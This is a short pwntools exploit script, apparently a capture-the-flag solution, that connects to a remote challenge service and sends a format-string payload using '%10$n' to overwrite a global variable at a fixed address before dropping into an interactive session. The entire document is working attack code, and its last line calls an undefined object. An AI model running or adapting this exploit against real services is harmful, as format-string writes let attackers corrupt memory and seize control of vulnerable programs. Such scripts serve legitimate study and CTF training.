from pwn import *
#使用pwndbg进行远程调试
context.log_level = 'debug'
p=remote('220.249.52.133',37770)
elf = ELF('./CGFfsb')
#p=process('./cgfsb')
pwnme_addr=0x0804a068
payload=p32(pwnme_addr)+'aaaa'+'%10$n'
p.recvuntil('please tell me your name:\n')
p.sendline('aaaaaaa')
p.recvuntil('leave your message please:\n')
p.sendline(payload)
#print p.recv() 
#print p.recv()
p.interactive()
conn.close()
